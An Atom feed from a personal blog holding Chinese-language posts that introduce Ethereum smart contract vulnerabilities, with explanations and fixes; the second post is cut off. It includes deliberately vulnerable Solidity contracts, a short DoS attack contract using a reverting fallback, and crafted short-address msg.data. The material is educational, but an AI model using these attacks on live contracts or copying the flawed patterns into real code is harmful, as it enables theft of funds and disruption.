<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>rickgray.me</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://rickgray.me/"/>
  <updated>2018-05-25T19:17:51.468Z</updated>
  <id>http://rickgray.me/</id>
  
  <author>
    <name>RickGray</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>以太坊智能合约安全入门了解一下（下）</title>
    <link href="http://rickgray.me/2018/05/26/ethereum-smart-contracts-vulnerabilities-review-part2/"/>
    <id>http://rickgray.me/2018/05/26/ethereum-smart-contracts-vulnerabilities-review-part2/</id>
    <published>2018-05-25T16:00:00.000Z</published>
    <updated>2018-05-25T19:17:51.468Z</updated>
    
    <content type="html"><![CDATA[<p><strong>（注：本文分上/下两部分完成，上篇链接<a href="http://rickgray.me/2018/05/17/ethereum-smart-contracts-vulnerabilites-review/">《以太坊智能合约安全入门了解一下（上）》</a>）</strong> 接上篇</p><h4 id="3-Arithmetic-Issues"><a href="#3-Arithmetic-Issues" class="headerlink" title="3. Arithmetic Issues"></a>3. Arithmetic Issues</h4><p>算数问题？通常来说，在编程语言里算数问题导致的漏洞最多的就是整数溢出了，整数溢出又分为上溢和下溢。整数溢出的原理其实很简单，这里以 8 位无符整型为例，8 位整型可表示的范围为 <code>[0, 255]</code>，<code>255</code> 在内存中存储按位存储的形式为（下图左）：</p><p><img src="/images/articles/2018-05-26-ethereum-smart-contracts-vulnerabilities-review-part2/8.png" alt=""></p><p>8 位无符整数 255 在内存中占据了 8bit 位置，若再加上 1 整体会因为进位而导致整体翻转为 0，最后导致原有的 8bit 表示的整数变为 0.</p><p>如果是 8 位有符整型，其可表示的范围为 <code>[-128, 127]</code>，<code>127</code> 在内存中存储按位存储的形式为（下图左）：</p><p><img src="/images/articles/2018-05-26-ethereum-smart-contracts-vulnerabilities-review-part2/9.png" alt=""></p><p>在这里因为高位作为了符号位，当 <code>127</code> 加上 1 时，由于进位符号位变为 <code>1</code>（负数），因为符号位已翻转为 <code>1</code>，通过还原此负数值，最终得到的 8 位有符整数为 <code>-128</code>。</p><p>上面两个都是整数上溢的图例，同样整数下溢 <code>(uint8)0-1=(uint8)255</code>, <code>(int8)(-128)-1=(int8)127</code>。</p><p>在 <code>withdraw(uint)</code> 函数中首先通过 <code>require(balances[msg.sender] - _amount &gt; 0)</code> 来确保账户有足够的余额可以提取，随后通过 <code>msg.sender.transfer(_amount)</code> 来提取 Ether，最后更新用户余额信息。这段代码若是一个没有任何安全编码经验的人来审计，代码的逻辑处理流程似乎看不出什么问题，但是如果是编码经验丰富或者说是安全研究人员来看，这里就明显存在整数溢出绕过检查的漏洞。</p><p>在 Solidity 中 <code>uint</code> 默认为 256 位无符整型，可表示范围 <code>[0, 2**256-1]</code>，在上面的示例代码中通过做差的方式来判断余额，如果传入的 <code>_amount</code> 大于账户余额，则 <code>balances[msg.sender] - _amount</code> 会由于整数下溢而大于 0 绕过了条件判断，最终提取大于用户余额的 Ether，且更新后的余额可能会是一个极其大的数。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.10</span>;</span><br><span class="line"></span><br><span class="line">contract MyToken &#123;</span><br><span class="line">    mapping (<span class="function"><span class="params">address</span> =&gt;</span> uint) balances;</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">balanceOf</span>(<span class="params">address _user</span>) <span class="title">returns</span> (<span class="params">uint</span>) </span>&#123; <span class="keyword">return</span> balances[_user]; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">deposit</span>(<span class="params"></span>) <span class="title">payable</span> </span>&#123; balances[msg.sender] += msg.value; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">withdraw</span>(<span class="params">uint _amount</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(balances[msg.sender] - _amount &gt; <span class="number">0</span>);  <span class="comment">// 存在整数溢出</span></span><br><span class="line">        msg.sender.transfer(_amount);</span><br><span class="line">        balances[msg.sender] -= _amount;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简单的利用过程演示：</p><p><img src="/images/articles/2018-05-26-ethereum-smart-contracts-vulnerabilities-review-part2/integer_down_overflow.gif" alt=""></p><p>为了避免上面代码造成的整数溢出，可以将条件判断改为 <code>require(balances[msg.sender] &gt; _amount)</code>，这样就不会执行算术操作进行进行逻辑判断，一定程度上避免了整数溢出的发生。</p><p>Solidity 除了简单的算术操作会出现整数溢出外，还有一些需要注意的编码细节，稍不注意就可能形成整数溢出导致无法执行正常代码流程：</p><ul><li>数组 <code>length</code> 为 256 位无符整型，仔细对 <code>array.length++</code> 或者 <code>array.length--</code> 操作进行溢出校验；</li><li>常见的循环变量 <code>for (var i = 0; i &lt; items.length; i++) ...</code> 中，<code>i</code> 为 8 位无符整型，当 <code>items</code> 长度大于 256 时，可能造成 <code>i</code> 值溢出无法遍历完全；</li></ul><p>关于合约整数溢出的漏洞并不少见，可以看看最近曝光的几起整数溢出事件：<a href="https://www.anquanke.com/post/id/145520" target="_blank" rel="noopener">《代币变泡沫，以太坊Hexagon溢出漏洞比狗庄还过分》</a>，<a href="https://www.anquanke.com/post/id/106382" target="_blank" rel="noopener">《Solidity合约中的整数安全问题——SMT/BEC合约整数溢出解析》</a></p><p><strong>为了防止整数溢出的发生，一方面可以在算术逻辑前后进行验证，另一方面可以直接使用 OpenZeppelin 维护的一套智能合约函数库中的 <a href="https://github.com/OpenZeppelin/openzeppelin-solidity/blob/master/contracts/math/SafeMath.sol" target="_blank" rel="noopener">SafeMath</a> 来处理算术逻辑。</strong></p><h4 id="4-Unchecked-Return-Values-For-Low-Level-Calls"><a href="#4-Unchecked-Return-Values-For-Low-Level-Calls" class="headerlink" title="4. Unchecked Return Values For Low Level Calls"></a>4. Unchecked Return Values For Low Level Calls</h4><p>未严格判断不安全函数调用返回值，这类型的漏洞其实很好理解，在前面讲 Reentrancy 实例的时候其实也涉及到了底层调用返回值处理验证的问题。上篇已经总结过几个底层调用函数的返回值和异常处理情况，这里再回顾一下 3 个底层调用 <code>call()</code>, <code>delegatecall()</code>, <code>callcode()</code> 和 3 个转币函数 <code>call.value()()</code>, <code>send()</code>, <code>transfer()</code>：</p><p><strong>- call()</strong></p><p><code>call()</code> 用于 Solidity 进行外部调用，例如调用外部合约函数 <code>&lt;address&gt;.call(bytes4(keccak(&quot;somefunc(params)&quot;), params))</code>，外部调用 <code>call()</code> 返回一个 bool 值来表明外部调用成功与否：</p><p><img src="/images/articles/2018-05-26-ethereum-smart-contracts-vulnerabilities-review-part2/13.png" alt=""></p><p><strong>- delegatecall()</strong></p><p>除了 <code>delegatecall()</code> 会将外部代码作直接作用于合约上下文以外，其他与 <code>call()</code> 一致，同样也是只能获取一个 bool 值来表示调用成功或者失败（发生异常）。</p><p><strong>- callcode()</strong></p><p><code>callcode()</code> 其实是 <code>delegatecall()</code> 之前的一个版本，两者都是将外部代码加载到当前上下文中进行执行，但是在 <code>msg.sender</code> 和 <code>msg.value</code> 的指向上却有差异。</p><p>例如 Alice 通过 <code>callcode()</code> 调用了 Bob 合约里同时 <code>delegatecall()</code> 了 Wendy 合约中的函数，这么说可能有点抽象，看下面的代码：</p><p><img src="/images/articles/2018-05-26-ethereum-smart-contracts-vulnerabilities-review-part2/14.png" alt=""></p><p>如果还是不明白 <code>callcode()</code> 与 <code>delegatecall()</code> 的区别，可以将上述代码在 remix-ide 里测试一下，观察两种调用方式在 <code>msg.sender</code> 和 <code>msg.value</code> 上的差异。</p><p><strong>- call.value()()</strong></p><p>在合约中直接发起 TX 的函数之一（相当危险），</p><p><strong>- send()</strong></p><p>通过 <code>send()</code> 函数发送 Ether 失败时直接返回 false；这里需要注意的一点就是，<code>send()</code> 的目标如果是合约账户，则会尝试调用它的 fallbcak() 函数，fallback() 函数中执行失败，<code>send()</code> 同样也只会返回 false。但由于只会提供 2300 Gas 给 fallback() 函数，所以可以防重入漏洞（恶意递归调用）。</p><p><strong>- transfer()</strong></p><p><code>transfer()</code> 也可以发起 Ether 交易，但与 <code>send()</code> 不同的时，<code>transfer()</code> 是一个较为安全的转币操作，当发送失败时会自动回滚状态，该函数调用没有返回值。同样的，如果 <code>transfer()</code> 的目标是合约账户，也会调用合约的 fallback() 函数，并且只会传递 2300 Gas 用于 fallback() 函数执行，可以防止重入漏洞（恶意递归调用）。</p><p>这里以一个简单的示例来说明严格验证底层调用返回值的重要性：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">withdraw</span>(<span class="params">uint256 _amount</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line"><span class="built_in">require</span>(balances[msg.sender] &gt;= _amount);</span><br><span class="line">balances[msg.sender] -= _amount;</span><br><span class="line">etherLeft -= _amount;</span><br><span class="line">msg.sender.send(_amount);  <span class="comment">// 未验证 send() 返回值，若 msg.sender 为合约账户 fallback() 调用失败，则 send() 返回 false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面给出的提币流程中使用 <code>send()</code> 函数进行转账，因为这里没有验证 <code>send()</code> 返回值，如果 msg.sender 为合约账户 fallback() 调用失败，则 send() 返回 false，最终导致账户余额减少了，钱却没有拿到。</p><p>关于该类问题可以详细了解一下 <a href="https://www.kingoftheether.com/postmortem.html" target="_blank" rel="noopener">King of the Ether</a>。</p><h4 id="5-Denial-of-Service-拒绝服务"><a href="#5-Denial-of-Service-拒绝服务" class="headerlink" title="5. Denial of Service - 拒绝服务"></a>5. Denial of Service - 拒绝服务</h4><p>DoS 无处不在，在 Solidity 里也是，与其说是拒绝服务漏洞不如简单的说成是 “不可恢复的恶意操作或者可控制的无限资源消耗”。简单的说就是对以太坊合约进行 DoS 攻击，可能导致 Ether 和 Gas 的大量消耗，更严重的是让原本的合约代码逻辑无法正常运行。</p><p>下面一个例子（代码改自 DASP 中例子）：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.10</span>;</span><br><span class="line"></span><br><span class="line">contract PresidentOfCountry &#123;</span><br><span class="line">    address public president;</span><br><span class="line">    uint256 price;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">PresidentOfCountry</span>(<span class="params">uint256 _price</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(_price &gt; <span class="number">0</span>);</span><br><span class="line">        price = _price;</span><br><span class="line">        president = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">becomePresident</span>(<span class="params"></span>) <span class="title">payable</span> </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.value &gt;= price); <span class="comment">// must pay the price to become president</span></span><br><span class="line">        president.transfer(price);   <span class="comment">// we pay the previous president</span></span><br><span class="line">        president = msg.sender;      <span class="comment">// we crown the new president</span></span><br><span class="line">        price = price * <span class="number">2</span>;           <span class="comment">// we double the price to become president</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一个简单的类似于 KingOfEther 的合约，按合约的正常逻辑任何出价高于合约当前 <code>price</code> 的都能成为新的 president，原有合约里的存款会返还给上一人 president，并且这里也使用了 <code>transfer()</code> 来进行 Ether 转账，看似没有问题的逻辑，但不要忘了，以太坊中有两类账户类型，如果发起 <code>becomePresident()</code> 调用的是个合约账户，并且成功获取了 president，如果其 fallback() 函数恶意进行了类似 <code>revert()</code> 这样主动跑出错误的操作，那么其他账户也就无法再正常进行 becomePresident 逻辑成为 president 了。</p><p>简单的攻击代码如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">contract Attack &#123;</span><br><span class="line">    function () &#123; revert(); &#125;</span><br><span class="line">    </span><br><span class="line">    function Attack(address _target) payable &#123;</span><br><span class="line">        _target.call.value(msg.value)(bytes4(keccak256(&quot;becomePresident()&quot;)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用 remix-ide 模拟攻击流程：</p><p><img src="/images/articles/2018-05-26-ethereum-smart-contracts-vulnerabilities-review-part2/president_of_country_demo.gif" alt=""></p><h4 id="6-Bad-Randomness-可预测的随机处理"><a href="#6-Bad-Randomness-可预测的随机处理" class="headerlink" title="6. Bad Randomness - 可预测的随机处理"></a>6. Bad Randomness - 可预测的随机处理</h4><p>伪随机问题一直都存在于现代计算机系统中，但是在开放的区块链中，像在以太坊智能合约中编写的基于随机数的处理逻辑感觉就有点不切实际了，由于人人都能访问链上数据，合约中的存储数据都能在链上查询分析得到。如果合约代码没有严格考虑到链上数据公开的问题去使用随机数，可能会被攻击者恶意利用来进行 “作弊”。</p><p>摘自 DASP 的代码块：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">uint256 private seed;</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">play</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line"><span class="built_in">require</span>(msg.value &gt;= <span class="number">1</span> ether);</span><br><span class="line">iteration++;</span><br><span class="line">uint randomNumber = uint(keccak256(seed + iteration));</span><br><span class="line"><span class="keyword">if</span> (randomNumber % <span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">msg.sender.transfer(<span class="keyword">this</span>.balance);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里 <code>seed</code> 变量被标记为了私有变量，前面有说过链上的数据都是公开的，<code>seed</code> 的值可以通过扫描与该合约相关的 TX 来获得。获取 <code>seed</code> 值后，同样的 <code>iteration</code> 值也是可以得到的，那么整个 <code>uint(keccak256(seed + iteration))</code> 的值就是可预测的了。</p><p>就 DASP 里面提到的，还有一些合约喜欢用 <code>block.blockhash(uint blockNumber) returns (bytes32)</code> 来获取一个随机哈希，但是这里切记不能使用 <code>block.number</code> 也就是当前块号来作为 <code>blockNumber</code> 的值，因为在官方文档中明确写了：</p><blockquote><p>block.blockhash(uint blockNumber) returns (bytes32): hash of the given block - only works for 256 most recent blocks excluding current</p></blockquote><p>意思是说 <code>block.blockhash()</code> 只能使用近 256 个块的块号来获取 Hash 值，并且还强调了不包含当前块，如果使用当前块进行计算 <code>block.blockhash(block.numbber)</code> 其结果始终为 <code>0x0000000.....</code>：</p><p><img src="/images/articles/2018-05-26-ethereum-smart-contracts-vulnerabilities-review-part2/15.png" alt=""></p><p>同样的也不能使用 <code>block.timestamp</code>, <code>now</code> 这些可以由矿工控制的值来获取随机数。</p><p>一切链上的数据都是公开的，想要获取一个靠谱的随机数，使用链上的数据看来是比较难做到的了，这里有一个独立的项目 <a href="https://github.com/oraclize/ethereum-api" target="_blank" rel="noopener">Oraclize</a> 被设计来让 Smart Contract 与互联网进行交互，有兴趣的同学可以深入了解一下。（附上基于 Oraclize 的随机数获取方法 <a href="https://github.com/oraclize/ethereum-examples/blob/master/solidity/random-datasource/randomExample.sol" target="_blank" rel="noopener">randomExample</a>）</p><h4 id="7-Front-Running-提前交易"><a href="#7-Front-Running-提前交易" class="headerlink" title="7. Front Running - 提前交易"></a>7. Front Running - 提前交易</h4><p>“提前交易”，其实在学习以太坊智能合约漏洞之前，我还并不知道这类漏洞类型或者说是攻击手法（毕竟我对金融一窍不通）。简单来说，“提前交易”就是某人提前获取到交易者的具体交易信息（或者相关信息），抢在交易者完成操作之前，通过一系列手段（通常是提高报价）来抢在交易者前面完成交易。</p><p><img src="/images/articles/2018-05-26-ethereum-smart-contracts-vulnerabilities-review-part2/16.png" alt=""></p><p>在以太坊中所有的 TX 都需要经过确认才能完全记录到链上，而每一笔 TX 都需要带有相关手续费，而手续费的多少也决定了该笔 TX 被矿工确认的优先级，手续费高的 TX 会被优先得到确认，而每一笔待确认的 TX 在广播到网络之后就可以查看具体的交易详情，一些涉及到合约调用的详细方法和参数可以被直接获取到。那么这里显然就有 Front-Running 的隐患存在了，示例代码就不举了，直接上图（形象一点）：</p><p><img src="/images/articles/2018-05-26-ethereum-smart-contracts-vulnerabilities-review-part2/17.png" alt=""></p><p>在 <a href="https://etherscan.io/txsPending" target="_blank" rel="noopener">etherscan.io</a> 就能看到还未被确认的 TX，并且能给查看相关数据：</p><p><img src="/images/articles/2018-05-26-ethereum-smart-contracts-vulnerabilities-review-part2/18.png" alt=""></p><p><strong>（当然了，为了防止信息明文存储在 TX 中，可以对数据进行加密和签名）</strong></p><h4 id="8-Time-Manipulation"><a href="#8-Time-Manipulation" class="headerlink" title="8. Time Manipulation"></a>8. Time Manipulation</h4><p>“时间篡改”（DASP 给的名字真抽象 XD），说白了一切与时间相关的漏洞都可以归为 “Time Manipulation”。在 Solidity 中，<code>block.timestamp</code> （别名 <code>now</code>）是受到矿工确认控制的，也就是说一些合约依赖于 <code>block.timestamp</code> 是有被攻击利用的风险的，当攻击者有机会作为矿工对 TX 进行确认时，由于 <code>block.timestamp</code> 可以控制，一些依赖于此的合约代码即预知结果，攻击者可以选择一个合适的值来到达目的。（当然了 <code>block.timestamp</code> 的值通常有一定的取值范围，出块间隔有规定 XD）</p><p>该类型我还没有找到一个比较好的例子，所以这里就不给代码演示了。:)</p><h4 id="9-Short-Address-Attack-短地址攻击"><a href="#9-Short-Address-Attack-短地址攻击" class="headerlink" title="9. Short Address Attack - 短地址攻击"></a>9. Short Address Attack - 短地址攻击</h4><p>在我着手测试和复现合约漏洞类型时，短地址攻击我始终没有在 remix-ide 上测试成功（道理我都懂，咋就不成功呢？）。虽然漏洞没有复现，但是漏洞原理我还是看明白了，下面就详细地说明一下短地址攻击的漏洞原理吧。</p><p>首先我们以外部调用 <code>call()</code> 为例，外部调用中 <code>msg.data</code> 的情况：</p><p><img src="/images/articles/2018-05-26-ethereum-smart-contracts-vulnerabilities-review-part2/19.png" alt=""></p><p>在 remix-ide 中部署此合约并调用 <code>callFunc()</code> 时，可以得到日志输出的 <code>msg.data</code> 值：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x4142c000000000000000000000000000000000000000000000000000000000000000001e</span><br></pre></td></tr></table></figure><p>其中 <code>0x4142c000</code> 为外部调用的函数名签名头 4 个字节（<code>bytes4(keccak256(&quot;foo(uint32,bool)&quot;))</code>），而后面 32 字节即为传递的参数值，<code>msg.data</code> 一共为 4 字节函数签名加上 32 字节参数值，总共 <code>4+32</code> 字节。</p><p>看如下合约代码：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.10</span>;</span><br><span class="line"></span><br><span class="line">contract ICoin &#123;</span><br><span class="line">    address owner;</span><br><span class="line">    mapping (<span class="function"><span class="params">address</span> =&gt;</span> uint256) public balances;</span><br><span class="line"></span><br><span class="line">    modifier OwnerOnly() &#123; <span class="built_in">require</span>(msg.sender == owner); _; &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ICoin</span>(<span class="params"></span>) </span>&#123; owner = msg.sender; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">approve</span>(<span class="params">address _to, uint256 _amount</span>) <span class="title">OwnerOnly</span> </span>&#123; balances[_to] += _amount; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">transfer</span>(<span class="params">address _to, uint256 _amount</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(balances[msg.sender] &gt; _amount);</span><br><span class="line">        balances[msg.sender] -= _amount;</span><br><span class="line">        balances[_to] += _amount;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>具体代币功能的合约 ICoin，当 A 账户向 B 账户转代币时调用 <code>transfer()</code> 函数，例如 A 账户（0x14723a09acff6d2a60dcdf7aa4aff308fddc160c）向 B 账户（0x4b0897b0513fdc7c541b6d9d7e929c4e5364d2db）转 8 个 ICoin，<code>msg.data</code> 数据为：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0xa9059cbb  -&gt; bytes4(keccak256(&quot;transfer(address,uint256)&quot;)) 函数签名</span><br><span class="line">0000000000000000000000004b0897b0513fdc7c541b6d9d7e929c4e5364d2db  -&gt; B 账户地址（前补 0 补齐 32 字节）</span><br><span class="line">0000000000000000000000000000000000000000000000000000000000000008  -&gt; 0x8（前补 0 补齐 32 字节）</span><br></pre></td></tr></table></figure><p>那么短地址攻击是怎么做的呢，攻击者找到一个末尾是 <code>00</code> 账户地址，假设为 <code>0x4b0897b0513fdc7c541b6d9d7e929c4e5364d200</code>，那么正常情况下整个调用的 <code>msg.data</code> 应该为：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0xa9059cbb  -&gt; bytes4(keccak256(&quot;transfer(address,uint256)&quot;)) 函数签名</span><br><span class="line">0000000000000000000000004b0897b0513fdc7c541b6d9d7e929c4e5364d200  -&gt; B 账户地址（注意末尾 00）</span><br><span class="line">0000000000000000000000000000000000000000000000000000000000000008  -&gt; 0x8（前补 0 补齐 32 字节）</span><br></pre></td></tr></table></figure><p>但是如果我们将 B 地址的 <code>00</code> 吃掉，不进行传递，也就是说我们少传递 1 个字节变成 <code>4+31+32</code>：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0xa9059cbb  -&gt; bytes4(keccak256(&quot;transfer(address,uint256)&quot;)) 函数签名</span><br><span class="line">0000000000000000000000004b0897b0513fdc7c541b6d9d7e929c4e5364d2  -&gt; B 地址（31 字节）</span><br><span class="line">0000000000000000000000000000000000000000000000000000000000000008  -&gt; 0x8（前补 0 补齐 32 字节）</span><br></pre></td></tr></table></figure><p>当上面数据进入 EVM 进行处理时，会犹豫参数对齐的问题后补 <code>00</code> 变为：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0xa9059cbb</span><br><span class="line">0000000000000000000000004b0897b0513fdc7c541b6d9d7e929c4e5364d200</span><br><span class="line">0000000000000000000000000000000000000000000000000000000000000800</span><br></pre></td></tr></table></figure><p>也就是说，恶意构造的 <code>msg.data</code> 通过 EVM 解析补 0 操作，导致原本 <code>0x8 = 8</code> 变为了 <code>0x800 = 2048</code>。</p><p>上述 EVM 对畸形字节的 <code>msg.data</code> 进行补位操作的行为其实就是短地址攻击的原理（但这里我真的没有复现成功，希望有成功的同学联系我一起交流）。</p><p>短地址攻击通常发生在接受畸形地址的地方，如交易所提币、钱包转账，所以除了在编写合约的时候需要严格验证输入数据的正确性，而且在 Off-Chain 的业务功能上也要对用户所输入的地址格式进行验证，防止短地址攻击的发生。</p><p>同时，老外有一篇介绍 <a href="https://ericrafaloff.com/analyzing-the-erc20-short-address-attack/" target="_blank" rel="noopener">Analyzing the ERC20 Short Address Attack</a> 原理的文章我觉得非常值得学习。</p><h4 id="Unknown-Unknowns-其他未知，-未知漏洞，没啥好讲的，为了跟-DASP-保持一致而已"><a href="#Unknown-Unknowns-其他未知，-未知漏洞，没啥好讲的，为了跟-DASP-保持一致而已" class="headerlink" title="- Unknown Unknowns - 其他未知，:) 未知漏洞，没啥好讲的，为了跟 DASP 保持一致而已"></a>- Unknown Unknowns - 其他未知，:) 未知漏洞，没啥好讲的，为了跟 DASP 保持一致而已</h4><h3 id="III-自我思考"><a href="#III-自我思考" class="headerlink" title="III. 自我思考"></a>III. 自我思考</h3><p>前后花了 2 周多的时间去看以太坊智能合约相关知识以及本文（上/下）的完成，久违的从 0 到 1 的感觉又回来了。多的不说了，我应该也算是以太坊智能合约安全入门了吧，近期出的一些合约漏洞事件也在跟，分析和复现也是完全 OK 的，漏洞研究原理不变，变得只是方向而已。期待同更多的区块链安全研究者交流和学习。</p><h4 id="1-以太坊中合约账户的私钥在哪？可以不通过合约账户代码直接操作合约账户中的-Ether-吗？"><a href="#1-以太坊中合约账户的私钥在哪？可以不通过合约账户代码直接操作合约账户中的-Ether-吗？" class="headerlink" title="1. 以太坊中合约账户的私钥在哪？可以不通过合约账户代码直接操作合约账户中的 Ether 吗？"></a>1. 以太坊中合约账户的私钥在哪？可以不通过合约账户代码直接操作合约账户中的 Ether 吗？</h4><p>StackExchange 上有相关问题的回答 <a href="https://ethereum.stackexchange.com/questions/185/where-is-the-private-key-for-a-contract-stored" target="_blank" rel="noopener">“Where is the private key for a contract stored?”</a>，但是我最终也没有看到比较官方的答案。但可以知道的就是，合约账户是由部署时的合约代码控制的，<strong>不确定是否有私钥可以直接控制合约进行 Ether 相关操作</strong>（讲道理应该是不行的）。</p><h4 id="2-使用-keccak256-进行函数签名时的坑？-参数默认位数标注"><a href="#2-使用-keccak256-进行函数签名时的坑？-参数默认位数标注" class="headerlink" title="2. 使用 keccak256() 进行函数签名时的坑？- 参数默认位数标注"></a>2. 使用 keccak256() 进行函数签名时的坑？- 参数默认位数标注</h4><p>在使用 keccak256 对带参函数进行签名时，需要注意要严格制定参数类型的位数，如：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">somefunc</span>(<span class="params">uint n</span>) </span>&#123; ... &#125;</span><br></pre></td></tr></table></figure><p>对上面函数进行签名时，定义时参数类型为 <code>uint</code>，而 <code>uint</code> 默认为 256 位，也就是 <code>uint256</code>，所以在签名时应该为 <code>keccak256(&quot;somefunc(uint256)&quot;)</code>，千万不能写成 <code>keccak256(&quot;somefunc(uint)&quot;)</code>。</p><h3 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h3><ul><li><a href="http://solidity.readthedocs.io/en/v0.4.21/units-and-global-variables.html#special-variables-and-functions" target="_blank" rel="noopener">http://solidity.readthedocs.io/en/v0.4.21/units-and-global-variables.html#special-variables-and-functions</a></li><li><a href="https://github.com/oraclize/ethereum-api" target="_blank" rel="noopener">https://github.com/oraclize/ethereum-api</a></li><li><a href="https://ericrafaloff.com/analyzing-the-erc20-short-address-attack/" target="_blank" rel="noopener">https://ericrafaloff.com/analyzing-the-erc20-short-address-attack/</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;（注：本文分上/下两部分完成，上篇链接&lt;a href=&quot;http://rickgray.me/2018/05/17/ethereum-smart-contracts-vulnerabilites-review/&quot;&gt;《以太坊智能合约安全入门了解一下（上）》&lt;/
      
    
    </summary>
    
    
      <category term="security" scheme="http://rickgray.me/tags/security/"/>
    
      <category term="ethereum" scheme="http://rickgray.me/tags/ethereum/"/>
    
      <category term="blockchain" scheme="http://rickgray.me/tags/blockchain/"/>
    
  </entry>
  
  <entry>
    <title>以太坊智能合约安全入门了解一下（上）</title>
    <link href="http://rickgray.me/2018/05/17/ethereum-smart-contracts-vulnerabilites-review/"/>
    <id>http://rickgray.me/2018/05/17/ethereum-smart-contracts-vulnerabilites-review/</id>
    <published>2018-05-16T16:00:00.000Z</published>
    <updated>2018-05-25T19:04:50.667Z</updated>
    
    <content type="html"><![CDATA[<p><strong>（注：本文分上/下两部分完成）</strong></p><p>最近区块链漏洞不要太火，什么交易所用户被钓鱼导致 APIKEY 泄漏，代币合约出现整数溢出漏洞致使代币归零， MyEtherWallet 遭 DNS 劫持致使用户 ETH 被盗等等。频频爆出的区块链安全事件，越来越多的安全从业者将目标转到了 Blockchain 上。经过一段时间的恶补，让我从以太坊智能合约 “青铜I段” 升到了 “青铜III段”，本文将从以太坊智能合约的一些特殊机制说起，详细地剖析已发现各种漏洞类型，对每一种漏洞类型都会提供一段简单的合约代码来对漏洞成因和攻击方法进行说明。</p><p>在阅读接下来的文章内容之前，我假定你已经对以太坊智能合约的相关概念已经有了一定的了解。如果从开发者的角度来看智能，大概是这个样子：</p><p><img src="/images/articles/2018-05-17-ethereum-smart-contracts-vulnerabilites-review/1.png" alt=""></p><p>以太坊专门提供了一种叫 EVM 的虚拟机供合约代码运行，同时也提供了面向合约的语言来加快开发者开发合约，像官方推荐且用的最多的 Solidity 是一种语法类似 JavaScript 的合约开发语言。开发者按一定的业务逻辑编写合约代码，并将其部署到以太坊上，代码根据业务逻辑将数据记录在链上。以太坊其实就是一个应用生态平台，借助智能合约我们可以开发出各式各样的应用发布到以太坊上供业务直接使用。关于以太坊/智能合约的概念可参考<a href="http://solidity-cn.readthedocs.io/zh/develop/introduction-to-smart-contracts.html" target="_blank" rel="noopener">文档</a>。</p><p>接下来也是以 Solidity 为例来说明以太坊智能合约的一些已存在安全问题。</p><h3 id="I-智能合约开发-Solidity"><a href="#I-智能合约开发-Solidity" class="headerlink" title="I. 智能合约开发 - Solidity"></a>I. 智能合约开发 - Solidity</h3><p>Solidity 的语法类似 JavaSript，整体还是比较好上手，一个简单的用 Solidity 编写的合约代码如下</p><p><img src="/images/articles/2018-05-17-ethereum-smart-contracts-vulnerabilites-review/2.png" alt=""></p><p>语法相关的话我建议可以先看一下这个<a href="https://www.youtube.com/playlist?list=PLUMwusiHZZhpf8ItZBkR95ekkMGNKvuNR" target="_blank" rel="noopener">教学系列</a>（FQ），下面我说说我在学习和复习以太坊智能合约时一开始比较懵逼的地方：</p><h4 id="1-以太坊账户和智能合约区别"><a href="#1-以太坊账户和智能合约区别" class="headerlink" title="1. 以太坊账户和智能合约区别"></a>1. 以太坊账户和智能合约区别</h4><p>以太坊账户分两种，外部账户和合约账户。外部账户由一对公私钥进行管理，账户包含着 Ether 的余额，而合约账户除了可以含有 Ether 余额外，还拥有一段特定的代码，预先设定代码逻辑在外部账户或其他合约对其合约地址发送消息或发生交易时被调用和处理：</p><p><strong>外部账户 EOA</strong></p><ul><li>由公私钥对控制</li><li>拥有 ether 